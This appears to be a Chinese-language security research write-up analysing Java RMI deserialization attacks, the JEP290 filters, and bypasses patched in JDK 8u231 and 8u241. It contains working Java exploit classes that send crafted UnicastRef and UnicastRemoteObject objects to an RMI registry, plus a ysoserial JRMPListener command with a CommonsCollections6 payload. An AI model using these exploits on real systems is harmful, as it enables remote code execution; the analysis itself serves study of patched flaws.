分析下对各种攻击的影响，这里不分析具体的代码，只说现象：1、RegistryImpl_Skel强制RegistryImpl.checkAccess验证限制服务端和注册中心必须在同一host，相当于强制将服务端和注册中心绑定在一起，也就没有这两者之间的远程互相攻击了。2、配置了registry过滤器RegistryImpl_Skel里面的对象反序列化时会进行白名单校验，内容如下： 12345678910111213if (String.class == clazz || java.lang.Number.class.isAssignableFrom(clazz) || Remote.class.isAssignableFrom(clazz) || java.lang.reflect.Proxy.class.isAssignableFrom(clazz) || UnicastRef.class.isAssignableFrom(clazz) || RMIClientSocketFactory.class.isAssignableFrom(clazz) || RMIServerSocketFactory.class.isAssignableFrom(clazz) || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz) || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123; return ObjectInputFilter.Status.ALLOWED; &#125; else &#123; return ObjectInputFilter.Status.REJECTED; &#125; 没有任何一条完整的反序列化攻击链能通过这个白名单，这样前面攻击注册中心的方法都失效了。但RegistryImpl_Stub里面的方法没有过滤，毕竟为了功能正常使用是没办法白名单的，所以注册中心攻击客户端依然可行。3、配置了DGC过滤器DGCImpl_Skel和DGCImpl_Stub里面的对象反序列化时会进行白名单校验，内容如下： 123456return (clazz == ObjID.class || clazz == UID.class || clazz == VMID.class || clazz == Lease.class) ? ObjectInputFilter.Status.ALLOWED : ObjectInputFilter.Status.REJECTED; 同理，前面攻击DGC的方法也失效了。目前不受影响的攻击方法还剩下：客户端攻击服务端服务端攻击客户端注册中心攻击客户端JRMP服务端攻击JRMP客户端攻击客户端的场景不常见，而客户端攻击服务端需要知道远程接口。有没有办法不受限制的攻击服务端呢？从正常的调用过程来看，所有直接的反序列化点都已经记录下来了，那么可以找一下是否有上层调用。找了下发现只有一个点有，就是StreamRemoteCall#executeCall，其实也好理解，因为这个方法是JRMP层的，相对更底层一点，和具体的Stub/Skel类没有关系，调用的地方更多。并且这里触发点不在RegistryImpl/DGCImpl中，所以不受前面说的过滤器的影响，也就是说可以绕过JEP290对RMI反序列化攻击的过滤。接下来分析具体如何利用。 绕过JEP290攻击服务端/注册中心StreamRemoteCall#execute函数只在UnicastRef里面的两个invoke调用了。其实invoke就是调用远程方法，只有Stub才会调用这个函数，看看前面的出现的几种Stub里面调用invoke的地方：1、RegistryImpl_Stub中的list/lookup/bind/rebind/unbind方法2、RemoteObjectInvocationHandler#invokeRemoteMethod3、DGCImpl_Stub中的dirty/clean如果能在服务端/注册中心上创建上述Stub并且调用对应的方法，那么服务端就变成JRMP客户端，导致被攻击。天秀。那么有没有机会呢，首先分别看一下这三个Stub的创建流程。前面分析知道实际上Stub对象都是由Util#createProxy创建的，那么往上找调用链看看：1、RegistryImpl_Stub是由LocateRegistry#getRegistry创建的，服务端不会调用。2、远程对象Stub是在UnicastServerRef#exportObject创建，保存在Target的stub参数里面。但是没有找到服务端使用这个stub的地方。3、DGCImpl_Stub有两个地方创建，前面分析过，第一个是DGCImpl的静态代码块。第二处是在DGCClient$EndPointEntry的构造函数，再往上是DGCClient$EndPointEntry#lookup，然后是DGCClient#registerRefs。再往上找到两处1）LiveRef#readDGCClient.registerRefs在一个else里面 12345678910111213if (in instanceof ConnectionInputStream) &#123; ConnectionInputStream stream = (ConnectionInputStream)in; // save ref to send &quot;dirty&quot; call after all args/returns // have been unmarshaled. stream.saveRef(ref); if (isResultStream) &#123; // set flag in stream indicating that remote objects were // unmarshaled. A DGC ack should be sent by the transport. stream.setAckNeeded(); &#125;&#125; else &#123; DGCClient.registerRefs(ep, Arrays.asList(new LiveRef[] &#123; ref &#125;));&#125; 判断输入流是不是ConnectionInputStream，在RMI流程里面是进不去的。2）ConnectionInputStream#registerRefs 12345678void registerRefs() throws IOException &#123; if (!incomingRefTable.isEmpty()) &#123; for (Map.Entry&lt;Endpoint, List&lt;LiveRef&gt;&gt; entry : incomingRefTable.entrySet()) &#123; DGCClient.registerRefs(entry.getKey(), entry.getValue()); &#125; &#125;&#125; 这里有个if，需要incomingRefTable不为空才能进入。它的上层调用是StreamRemoteCall#releaseInputStream，再往上找调用点 1 UnicastServerRef#dispatch 2 RegistryImpl_Skel#dispatch 3 DGCImpl_Skel#dispatch 4 StreamRemoteCall#done前三个点在服务端，跟了下正常调用流程时incomingRefTable都是空，不会触发DGC#registerRefs创建DGCImpl_Stub。而StreamRemoteCall#done的调用点都和UnicastRef#invoke重复了，没啥意义。那么正常流程在服务端创建不了DGCImpl_Stub。所以现在需要想办法改变代码执行逻辑，让incomingRefTable不为空，搜索修改它的地方，发现只有一处ConnectionInputStream#saveRef 123456789101112131415161718192021/** * Save reference in order to send &quot;dirty&quot; call after all args/returns * have been unmarshaled. Save in hashtable incomingRefTable. This * table is keyed on endpoints, and holds objects of type * IncomingRefTableEntry. */void saveRef(LiveRef ref) &#123; Endpoint ep = ref.getEndpoint(); // check whether endpoint is already in the hashtable List&lt;LiveRef&gt; refList = incomingRefTable.get(ep); if (refList == null) &#123; refList = new ArrayList&lt;LiveRef&gt;(); incomingRefTable.put(ep, refList); &#125; // add ref to list of refs for endpoint ep refList.add(ref);&#125; 并且它的调用也只有一处LiveRef#read 12345678910111213141516171819202122232425262728293031323334 public static LiveRef read(ObjectInput in, boolean useNewFormat) throws IOException, ClassNotFoundException &#123; Endpoint ep; ObjID id; // Now read in the endpoint, id, and result flag // (need to choose whether or not to read old JDK1.1 endpoint format) if (useNewFormat) &#123; ep = TCPEndpoint.read(in); &#125; else &#123; ep = TCPEndpoint.readHostPortFormat(in); &#125; id = ObjID.read(in); boolean isResultStream = in.readBoolean(); LiveRef ref = new LiveRef(id, ep, false); if (in instanceof ConnectionInputStream) &#123; ConnectionInputStream stream = (ConnectionInputStream)in; // save ref to send &quot;dirty&quot; call after all args/returns // have been unmarshaled. stream.saveRef(ref); if (isResultStream) &#123; // set flag in stream indicating that remote objects were // unmarshaled. A DGC ack should be sent by the transport. stream.setAckNeeded(); &#125; &#125; else &#123; DGCClient.registerRefs(ep, Arrays.asList(new LiveRef[] &#123; ref &#125;)); &#125; return ref;&#125; 再往上发现LiveRef#read在UnicastRef#readExternal里调用了，这就有意思了。readExternal就是实现Externalize接口的类反序列化时触发的方法，那也就是说如果同一个输入流里有UnicastRef对象反序列化了，并且之后调用了releaseInputStream就能触发DGCClient$EndPointEntry的构造函数，最终触发makeDirtyCall发起UnicastRef#invoke，导致被攻击。顺便也发现了某些情况UnicastRef可以作为一个连接readExternal和readObject的gadget。前面分析过，正常调用流程里，当客户端调用RegistryImpl_Stub#lookup，对远程代理对象反序列化时，会创建DGCImpl_Stub。实际上就是因为当时反序列化了远程对象stub里面的RemoteObjectInvocationHandler，调用其父类RemoteObject#readObject，里面反序列化了UnicastRef。那么目前就知道了如何在服务端上创建一个DGCImpl_Stub并且调用dirty函数发送JRMP请求，但是如何把代码逻辑跳转到这里呢？实际上Java里面改变运行着的代码的逻辑的方法就那么几种：动态反射、动态代理、动态类加载、反序列化。这里很明显了，就是通过反序列化改变代码执行逻辑，相当于把原本分析的代码执行终点，也就是反序列化，变成了新的起点。正好UnicastRef是在注册中心反序列化白名单里面的。为什么要这么折腾呢？还不是因为被过滤了，只能想办法把一个受限的反序列化转变成不受限的反序列化。重新看看RegistryImpl_Skel 1234567891011121314151617181920case 2: // lookup(String)&#123; java.lang.String $param_String_1; try &#123; java.io.ObjectInput in = call.getInputStream(); $param_String_1 = (java.lang.String) in.readObject(); &#125; catch (java.io.IOException | java.lang.ClassNotFoundException e) &#123; throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e); &#125; finally &#123; call.releaseInputStream(); &#125; java.rmi.Remote $result = server.lookup($param_String_1); try &#123; java.io.ObjectOutput out = call.getResultStream(true); out.writeObject($result); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e); &#125; break;&#125; 由于添加了ip校验，虽然别的case逻辑也差不多，但实际上远程攻击只有lookup这一个反序列化点能用了。注意这里的逻辑，首先进行反序列化，然后finally里面调用call.releaseInputStream()。那么如果我传一个UnicastRef进去，这不就是上面的先反序列化UnicastRef修改incomingRefTable，然后releaseInputStream触发makedirtyCall的路径吗。那么现在知道，用Reigstry_Skel#dispatch里面的反序列化做入口点，就可以在注册中心成功创建一个可控的DGCImpl_Stub并触发JRMP请求。并且之前分析过是一直循环调用的，相当于一个自动回连的后门。具体的实现分两部分，第一部分是构造恶意对象，让注册中心发起dirty请求，这里和前面客户端攻击注册中心类似 123456789101112131415161718192021222324252627282930public class JRMPRegistryExploit &#123; public static void main(String[] args) throws Exception&#123; RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099); lookup(registry); &#125; public static void lookup(RegistryImpl_Stub registry) throws Exception &#123; Class RemoteObjectClass = registry.getClass().getSuperclass().getSuperclass(); Field refField = RemoteObjectClass.getDeclaredField(&quot;ref&quot;); refField.setAccessible(true); UnicastRef ref = (UnicastRef) refField.get(registry); Operation[] operations = new Operation[]&#123;new Operation(&quot;void bind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;java.lang.String list()[]&quot;), new Operation(&quot;java.rmi.Remote lookup(java.lang.String)&quot;), new Operation(&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;void unbind(java.lang.String)&quot;)&#125;; RemoteCall var2 = ref.newCall(registry, operations, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(genEvilJRMPObj()); ref.invoke(var2); &#125; private static Object genEvilJRMPObj() &#123; LiveRef liveRef = new LiveRef(new ObjID(), new TCPEndpoint(&quot;127.0.0.1&quot;, 7777), false); UnicastRef unicastRef = new UnicastRef(liveRef); return unicastRef; &#125;&#125; 第二部分是恶意服务端，这部分就是ysoserial/exploit/JRMPListener了。 1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections6 calc 那么是不是也能用这种方法打服务端呢？看看服务端反序列化的地方： 123456789101112131415try &#123; unmarshalCustomCallData(in); params = unmarshalParameters(obj, method, marshalStream); &#125; catch (AccessException aex) &#123; // For compatibility, AccessException is not wrapped in UnmarshalException // disable saving any refs in the inputStream for GC ((StreamRemoteCall) call).discardPendingRefs(); throw aex; &#125; catch (java.io.IOException | ClassNotFoundException e) &#123; // disable saving any refs in the inputStream for GC ((StreamRemoteCall) call).discardPendingRefs(); throw new UnmarshalException( &quot;error unmarshalling arguments&quot;, e); &#125; finally &#123; call.releaseInputStream(); unmarshalParameters里面反序列化，最后调用releaseInputStream，所以理论上也是可以的，但是没什么意义，这个方法的优势在于bypass JEP290，打服务端本来也不受影响。而且这里一样需要知道远程接口才可以。 其他尝试再找找还有没有其他触发readObject的点，在RMI相关的包里搜索发现还有一个TCPEndpoint#read 1234567891011121314151617181920212223242526272829303132/** * Get the endpoint from the input stream. * @param in the input stream * @exception IOException If id could not be read (due to stream failure) */public static TCPEndpoint read(ObjectInput in) throws IOException, ClassNotFoundException&#123; String host; int port; RMIClientSocketFactory csf = null; byte format = in.readByte(); switch (format) &#123; case FORMAT_HOST_PORT: host = in.readUTF(); port = in.readInt(); break; case FORMAT_HOST_PORT_FACTORY: host = in.readUTF(); port = in.readInt(); csf = (RMIClientSocketFactory) in.readObject(); break; default: throw new IOException(&quot;invalid endpoint format&quot;); &#125; return new TCPEndpoint(host, port, csf, null);&#125; 找调用，发现在LiveRef#read里，看看怎么进这个case，发现在UnicastRef2#readExternal 12345public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException&#123; ref = LiveRef.read(in, true);&#125; 看上去和前面的JRMP反打差不多，也是一个反序列化触发的反序列化，尝试攻击这里。 12345678910111213141516171819202122232425262728293031323334353637383940public class TCPEndPointExploit &#123; public static void main(String[] args) throws Exception&#123; RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099); lookup(registry); &#125; public static void lookup(RegistryImpl_Stub registry) throws Exception &#123; Class RemoteObjectClass = registry.getClass().getSuperclass().getSuperclass(); Field refField = RemoteObjectClass.getDeclaredField(&quot;ref&quot;); refField.setAccessible(true); UnicastRef ref = (UnicastRef) refField.get(registry); Operation[] operations = new Operation[]&#123;new Operation(&quot;void bind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;java.lang.String list()[]&quot;), new Operation(&quot;java.rmi.Remote lookup(java.lang.String)&quot;), new Operation(&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;void unbind(java.lang.String)&quot;)&#125;; RemoteCall var2 = ref.newCall(registry, operations, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); LiveRef liveRef = new LiveRef(new ObjID(), new TCPEndpoint(&quot;127.0.0.1&quot;, 7777, new EvilRMISocketFactory(),new EvilRMISocketFactory()), false); UnicastRef2 ref2 = new UnicastRef2(liveRef); var3.writeObject(ref2); ref.invoke(var2); &#125; public static class EvilRMISocketFactory implements RMIClientSocketFactory,RMIServerSocketFactory, Serializable &#123; HashMap map; public EvilRMISocketFactory() throws Exception &#123; this.map = genEvilMap(); &#125; @Override public Socket createSocket(String host, int port) throws IOException &#123; return null; &#125; @Override public ServerSocket createServerSocket(int port) throws IOException &#123; return null; &#125; &#125; 失败了，原因是虽然UnicastRef2继承了UnicastRef，可以通过过滤器。但之后在TCPEndPoint#read里对输入流反序列化时实际上和前面用的是同一个输入流，也就是TCPEndPoint中的反序列化依然会被registryfilter拦截，无法Bypass JEP290。低版本还是可以打的，但多少有点多此一举。反正之前没见别人发过，记录下。实际上在整个调用流程中，我们能控制和改变代码执行走向的只有反序列化点。而前面介绍的JRMP反打就是将受限反序列化转化成不受限反序列化，果然反序列化漏洞就是戴着镣铐跳舞。 JDK8u231修复与绕过而在jdk8u231中，RMI又增加了新的安全措施。首先是对注册中心进行了加固，更新后的RegistryImpl_Skel#dispatch 1234567891011121314151617181920212223case 2: // lookup(String)&#123; java.lang.String $param_String_1; try &#123; java.io.ObjectInput in = call.getInputStream(); $param_String_1 = (java.lang.String) in.readObject(); &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123; call.discardPendingRefs(); throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e); &#125; finally &#123; call.releaseInputStream(); &#125; java.rmi.Remote $result = server.lookup($param_String_1); try &#123; java.io.ObjectOutput out = call.getResultStream(true); out.writeObject($result); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e); &#125; break;&#125;...... 在反序列化异常后会进入call.discardPendingRefs()，其实就是把incomingRefTable清空。那么lookup的时候类型转换肯定会抛异常，也就没办法攻击了。还有一处修复在DGCImpl_Stub 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768public void clean(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, long $param_long_2, java.rmi.dgc.VMID $param_VMID_3, boolean $param_boolean_4) throws java.rmi.RemoteException &#123; try &#123; StreamRemoteCall call = (StreamRemoteCall)ref.newCall((java.rmi.server.RemoteObject) this, operations, 0, interfaceHash); call.setObjectInputFilter(DGCImpl_Stub::leaseFilter); try &#123; java.io.ObjectOutput out = call.getOutputStream(); out.writeObject($param_arrayOf_ObjID_1); out.writeLong($param_long_2); out.writeObject($param_VMID_3); out.writeBoolean($param_boolean_4); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling arguments&quot;, e); &#125; ref.invoke(call); ref.done(call); &#125; catch (java.lang.RuntimeException e) &#123; throw e; &#125; catch (java.rmi.RemoteException e) &#123; throw e; &#125; catch (java.lang.Exception e) &#123; throw new java.rmi.UnexpectedException(&quot;undeclared checked exception&quot;, e); &#125; &#125; // implementation of dirty(ObjID[], long, Lease) public java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, long $param_long_2, java.rmi.dgc.Lease $param_Lease_3) throws java.rmi.RemoteException &#123; try &#123; StreamRemoteCall call = (StreamRemoteCall)ref.newCall((java.rmi.server.RemoteObject) this, operations, 1, interfaceHash); call.setObjectInputFilter(DGCImpl_Stub::leaseFilter); try &#123; java.io.ObjectOutput out = call.getOutputStream(); out.writeObject($param_arrayOf_ObjID_1); out.writeLong($param_long_2); out.writeObject($param_Lease_3); &#125; catch (java.io.IOException e) &#123; throw new java.rmi.MarshalException(&quot;error marshalling arguments&quot;, e); &#125; ref.invoke(call); java.rmi.dgc.Lease $result; Connection connection = call.getConnection(); try &#123; java.io.ObjectInput in = call.getInputStream(); $result = (java.rmi.dgc.Lease) in.readObject(); &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123; if (connection instanceof TCPConnection) &#123; // Modified to prevent re-use of the connection after an exception ((TCPConnection) connection).getChannel().free(connection, false); &#125; call.discardPendingRefs(); throw new java.rmi.UnmarshalException(&quot;error unmarshalling return&quot;, e); &#125; finally &#123; ref.done(call); &#125; return $result; &#125; catch (java.lang.RuntimeException e) &#123; throw e; &#125; catch (java.rmi.RemoteException e) &#123; throw e; &#125; catch (java.lang.Exception e) &#123; throw new java.rmi.UnexpectedException(&quot;undeclared checked exception&quot;, e); &#125; &#125; 把过滤器放在了invoke之前，这样invoke里面触发的反序列化也被拦截了。这两处哪一个对之前的JRMP攻击方式来说都是致命的，也就是说8u231之后原本用DGCImpl_Stub#dirty触发的JRMP反打的攻击也失效了。永不言败的安全人继续尝试绕过。从前面的分析可以知道，如果想在不知道远程接口的情况想攻击注册中心/服务端，目前能控制的最大范围就是注册中心和DGC的filter里面限制的几个类。而如果想实现攻击，要满足几个条件：1、找到一处不受限制的反序列化2、白名单类可以通过反序列化触发上述不受限的反序列化3、触发点就在readObject中之前的JRMP攻击方式满足前两点，但不满足第三点，因为它的触发点实际在releaseInputStream那么开始找，第一点不好说，从第二点入手。只能硬趟白名单，看看都有哪些：1、RegistryImpl_Skel，允许Remote/UnicastRef/RMIClientSocketFactory/RMIServerSocketFactory/ActivationID/UID2、DGCImpl_Skel，允许ObjID/UID/VMID/Lease看看这些类哪些是可以序列化并且重写了readObject/readExternal之类改变调用流程的，找了下有这些：UnicastRefUnicastRef2UnicastServerRefActivationIDRemoteObjectUnicastRemoteObject就这么几个，只能指着这几个类出菜了。UnicastRef和UnicastRef2，已经在前面的逻辑用过了，并且也走不出新的路径。UnicastServerRef反序列化基本什么也没做，忽略。ActivationID反序列化时也是直接从输入流反序列化，一样会被过滤。 12345678910111213141516171819private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException&#123; uid = (UID)in.readObject(); try &#123; Class&lt;? extends RemoteRef&gt; refClass = Class.forName(RemoteRef.packagePrefix + &quot;.&quot; + in.readUTF()) .asSubclass(RemoteRef.class); RemoteRef ref = refClass.newInstance(); ref.readExternal(in); activator = (Activator) Proxy.newProxyInstance(null, new Class&lt;?&gt;[] &#123; Activator.class &#125;, new RemoteObjectInvocationHandler(ref)); &#125; catch (InstantiationException e) &#123; ...... 但可以创建RemoteRef对象并调用readExternal，那么代码执行路径扩展到所有有无参构造的RemoteRef的无参构造方法和readExternal。但看了下还是没找到能利用的地方。RemoteObject和ActivationID差不多，都是只能走到UnicastRef的反序列化。最后的希望是UnicastRemoteObject，看看它的readObject 12345678910/** * Re-export the remote object when it is deserialized. */private void readObject(java.io.ObjectInputStream in) throws java.io.IOException, java.lang.ClassNotFoundException&#123; in.defaultReadObject(); reexport();&#125; reexport 12345678910111213/* * Exports this UnicastRemoteObject using its initialized fields because * its creation bypassed running its constructors (via deserialization * or cloning, for example). */private void reexport() throws RemoteException&#123; if (csf == null &amp;&amp; ssf == null) &#123; exportObject((Remote) this, port); &#125; else &#123; exportObject((Remote) this, port, csf, ssf); &#125;&#125; 这是一个发布的过程，把这个对象自己发布了出去。那直觉上感觉这里不就相当于在服务端发布一个已知的远程对象吗，尝试用客户端攻击服务端的方式攻击，试验下： 1234567891011121314151617181920212223242526272829303132333435363738public class ServerExploit &#123; public static void main(String[] args) throws Exception &#123; Constructor RemoteObjectConstructor = RemoteObject.class.getDeclaredConstructor( RemoteRef.class ); RemoteObjectConstructor.setAccessible(true); LiveRef liveRef = new LiveRef(new ObjID(7777), new TCPEndpoint(&quot;127.0.0.1&quot;, 7777), false); UnicastServerRef unicastServerRef = new UnicastServerRef(liveRef); Constructor&lt;?&gt; unicastRemoteObjectConstructor = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(UnicastRemoteObject.class, RemoteObjectConstructor); UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) unicastRemoteObjectConstructor.newInstance(unicastServerRef); Field portField = UnicastRemoteObject.class.getDeclaredField( &quot;port&quot; ); portField.setAccessible( true ); portField.set( unicastRemoteObject, 7777 ); Remote stub = UnicastRemoteObject.exportObject(unicastRemoteObject, 7777); invoke(stub); &#125; public static void invoke(Remote stub) throws Exception&#123; Field hField = stub.getClass().getSuperclass().getDeclaredField(&quot;h&quot;); hField.setAccessible(true); Object remoteObjectInvocationHandler = hField.get(stub); Field refField = remoteObjectInvocationHandler.getClass().getSuperclass().getDeclaredField(&quot;ref&quot;); refField.setAccessible(true); UnicastRef ref = (UnicastRef) refField.get(remoteObjectInvocationHandler); Method method = UnicastRemoteObject.class.getDeclaredMethod(&quot;unexportObject&quot;, Remote.class, boolean.class); Method methodToHash_mapsMethod = remoteObjectInvocationHandler.getClass().getDeclaredMethod(&quot;getMethodHash&quot;,Method.class); methodToHash_mapsMethod.setAccessible(true); Long hash = (Long) methodToHash_mapsMethod.invoke(stub, method); ref.invoke(stub, method, new Object[]&#123;genEvilMap(),false&#125;, hash); &#125;&#125; 果不其然，失败了。其实服务是发布出去了，失败的原因是找不到远程方法。分析发现是因为服务端获取远程方法的逻辑是读取远程接口，也就是继承Remote的那个接口里的方法。但实际上UnicastServerObject只继承了Remote一个接口，而Remote又是一个空接口。也不知道是不是巧合，反正这个攻击思路走不通。再尝试新的攻击可能，现在只有一条路就是UnicastRemoteObject的反序列化流程，而能控制的数据只有里面的这几个变量： 12345678910111213private int port = 0;/** * @serial client-side socket factory (if any) */private RMIClientSocketFactory csf = null;/** * @serial server-side socket factory (if any) to use when * exporting object */private RMIServerSocketFactory ssf = null; 以及父类RemoteObject里面的ref。但是ref在对象发布时会被赋值成一个新建的UnicastServerRef，也用不了。所以能用的就俩接口变量，目标是在反序列化流程里找到触发任意反序列化的点并且把payload传进去。咋看都是个不可能的任务，但是有猛人完成了，就是An Trinh在2019年发现的https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/其实说难也难，说直接也直接。因为已经被过滤的没有别的选择了，目前能控制的只有两个接口，而我们还需要放自己的payload等信息，那么往接口里放东西只有一种方法，就是用动态代理。而满足白名单过滤的动态代理也只有一个，就是RemoteObjectInvocationHandler。 123456789101112131415161718192021222324252627282930313233343536public Object invoke(Object proxy, Method method, Object[] args) throws Throwable&#123; if (! Proxy.isProxyClass(proxy.getClass())) &#123; throw new IllegalArgumentException(&quot;not a proxy&quot;); &#125; if (Proxy.getInvocationHandler(proxy) != this) &#123; throw new IllegalArgumentException(&quot;handler mismatch&quot;); &#125; if (method.getDeclaringClass() == Object.class) &#123; return invokeObjectMethod(proxy, method, args); &#125; else if (&quot;finalize&quot;.equals(method.getName()) &amp;&amp; method.getParameterCount() == 0 &amp;&amp; !allowFinalizeInvocation) &#123; return null; // ignore &#125; else &#123; return invokeRemoteMethod(proxy, method, args); &#125;&#125;private Object invokeRemoteMethod(Object proxy, Method method, Object[] args) throws Exception&#123; try &#123; if (!(proxy instanceof Remote)) &#123; throw new IllegalArgumentException( &quot;proxy not Remote instance&quot;); &#125; return ref.invoke((Remote) proxy, method, args, getMethodHash(method)); &#125; catch (Exception e) &#123; ...... 可以看到RemoteObjectInvocationHandler的invoke最后还真就会调用UnicastRef#invoke，只能说世间充满了巧合。那没啥说的了，就找调用ccf/ssf这两个变量的方法了，跟了一下就找到了。在TCPTransport#listen里面调用了TCPEndPoint#newServerSocket 123456789101112131415161718ServerSocket newServerSocket() throws IOException &#123; if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123; TCPTransport.tcpLog.log(Log.VERBOSE, &quot;creating server socket on &quot; + this); &#125; RMIServerSocketFactory serverFactory = ssf; if (serverFactory == null) &#123; serverFactory = chooseFactory(); &#125; ServerSocket server = serverFactory.createServerSocket(listenPort); // if we listened on an anonymous port, set the default port // (for this socket factory) if (listenPort == 0) setDefaultPort(server.getLocalPort(), csf, ssf); return server; 对ssf调用了函数，那么把ssf设置成一个代理RMIServerSocketFactory接口的动态代理，里面放RemoteObjectInvocationHandler，调用这里时最终就触发了executeCall，造成不受限的反序列化。借用动态代理的方法和CC1的AnnotationInvocationHandler异曲同工。实现下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public class UnicastRemoteObjectExploit &#123; public static void main(String[] args) throws Exception&#123; RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099); exploit(registry,&quot;127.0.0.1&quot;,7777); &#125; private static void exploit(RegistryImpl_Stub registry,String host,int port) throws Exception &#123; UnicastRemoteObject unicastRemoteObject = getObj(host,port); Class RemoteObjectClass = registry.getClass().getSuperclass().getSuperclass(); Field refField = RemoteObjectClass.getDeclaredField(&quot;ref&quot;); refField.setAccessible(true); UnicastRef ref = (UnicastRef) refField.get(registry); Operation[] operations = new Operation[]&#123;new Operation(&quot;void bind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;java.lang.String list()[]&quot;), new Operation(&quot;java.rmi.Remote lookup(java.lang.String)&quot;), new Operation(&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;void unbind(java.lang.String)&quot;)&#125;; RemoteCall var2 = ref.newCall(registry, operations, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); Field f = ObjectOutputStream.class.getDeclaredField( &quot;enableReplace&quot; ); f.setAccessible( true ); f.set( var3, false ); var3.writeObject(unicastRemoteObject); ref.invoke(var2); &#125; private static UnicastRemoteObject getObj(String host,int port) throws Exception&#123; LiveRef liveRef = new LiveRef(new ObjID(7777), new TCPEndpoint(host,port), false); UnicastRef ref = new UnicastRef(liveRef); RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(ref); RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(RMIServerSocketFactory.class.getClassLoader(), new Class[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,remoteObjectInvocationHandler ); Constructor RemoteObjectConstructor = RemoteObject.class.getDeclaredConstructor(RemoteRef.class); RemoteObjectConstructor.setAccessible(true); Constructor&lt;?&gt; unicastRemoteObjectConstructor = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(UnicastRemoteObject.class, RemoteObjectConstructor); UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) unicastRemoteObjectConstructor.newInstance(new UnicastRef(liveRef)); Field ssfField = unicastRemoteObject.getClass().getDeclaredField(&quot;ssf&quot;); ssfField.setAccessible(true); ssfField.set(unicastRemoteObject,rmiServerSocketFactory); return unicastRemoteObject; &#125;&#125; 一样是用JRMPListener监听。不像DGC那种循环触发的，这个是一次性的这个方法其实比之前的反序列化+releaseInputStream触发条件更简单，不受那个incomingRefTable的限制，因此也绕过了jdk8u231的第一处过滤。触发点也没走DGCImpl_Stub，绕过了jdk8u231的第二处过滤。 JDK8u241修复当然最后这个绕过方法也是惨遭毒手，在jdk8u241又进行了修复，直接在ObjectInputStream里加了个readString方法，用在了RegistryImpl_Skel里面 12ObjectInputStream in = (ObjectInputStream)call.getInputStream();$param_String_1 = SharedSecrets.getJavaObjectInputStreamReadString().readString(in); 这样一来注册中心里唯一的远程反序列化点也没有了，基本上把反序列化攻击注册中心的棺材板盖严实了。前面所有攻击注册中心的方法也都失效，应该也不会有新的方法了，RMI注册中心已安全。但其实RegistryImpl_Skel#bind之类的还是有反序列化点的，那里是不可能加这个类型限制的，退而求其次，假如是提权之类的场景，能不能本地打呢。但其实还是不行，因为8u241顺便修了RemoteObjectInvocationHandler#invokeRemoteMethod 1234567Class&lt;?&gt; decl = method.getDeclaringClass();if (!Remote.class.isAssignableFrom(decl)) &#123; throw new RemoteException(&quot;Method is not Remote: &quot; + decl + &quot;::&quot; + method);&#125;return ref.invoke((Remote) proxy, method, args, getMethodHash(method)); 如果调用方法的类没有实现Remote就不会调用ref.invoke，前面的RMIServerSocketFactory就被拦住了。寄了寄了。而在jdk8u231，能远程攻击服务端或注册中心的方法，除了上面说的An Trinh的方法，就只有在知道远程接口的情况下攻击服务端了。相同的道理UnicastRef#unmarshalValue方法也在这8u241版本做了一些修复： 1234567891011121314protected static Object unmarshalValue(Class&lt;?&gt; type, ObjectInput in) throws IOException, ClassNotFoundException&#123; if (type.isPrimitive()) &#123; if (type == int.class) &#123; return Integer.valueOf(in.readInt()); &#125; else if (type == boolean.class) &#123; ...... &#125; else if (type == String.class &amp;&amp; in instanceof ObjectInputStream) &#123; return SharedSecrets.getJavaObjectInputStreamReadString().readString((ObjectInputStream)in); &#125; else &#123; return in.readObject(); &#125;&#125; 和RegistryImpl_Skel一样的修复逻辑，如果参数类型是String就调用readString方法，而不是直接调用readObject。不过如果远程方法参数不是String而是其他类型依然可以攻击。那么目前已有的RMI反序列化攻击方式就整理完了，分析的过程里有几次觉得找到了新的bypass，最后发现都有各种原因不能实现，但分析后觉得以后应该也没有新的bypass了。最后整理下各种攻击方法和对应的版本，做了个表： 